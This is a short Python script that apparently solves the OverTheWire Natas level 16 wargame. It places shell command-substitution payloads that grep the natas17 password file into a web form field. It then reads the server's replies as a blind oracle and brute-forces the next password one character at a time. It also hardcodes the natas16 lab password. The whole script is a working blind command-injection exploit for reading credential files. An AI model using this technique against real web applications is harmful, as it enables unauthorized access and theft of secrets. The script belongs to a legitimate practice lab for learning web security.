#!/usr/bin/env python3

import requests
import string

natas16_pw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'


def find_existing(passwd):
    subset = string.ascii_letters + string.digits
    existing = ''

    for c in subset:
        probe_input = 'penetrated$(grep ' + c + ' /etc/natas_webpass/natas17)'
        r = requests.post('http://natas16.natas.labs.overthewire.org', auth=('natas16', passwd), data={'needle':probe_input})

        if 'penetrated' not in r.text:
            print('found: ' + c)
            existing += c

    return existing


def brute_force(subset, natas16_passwd):
    passwd = ''

    for i in range(len(natas16_passwd)):

        for c in subset:
            probe_input = 'penetrated$(grep ^' + passwd + c + ' /etc/natas_webpass/natas17)'
            r = requests.post('http://natas16.natas.labs.overthewire.org', auth=('natas16', natas16_passwd), data={'needle':probe_input})

            if 'penetrated' not in r.text:
                print('found: ' + c)
                passwd += c
                print('current password: ' + passwd)
                break

    return passwd

print('finding all matching characters within etc/natas_webpass/natas17...')
subset = find_existing(natas16_pw)
print('subset of existing characters: "' + subset + '"')

print('\nStarting brute force...')
natas17_pw = brute_force(subset, natas16_pw)

print('\nCOMPLETE!')
print('password: ' + natas17_pw)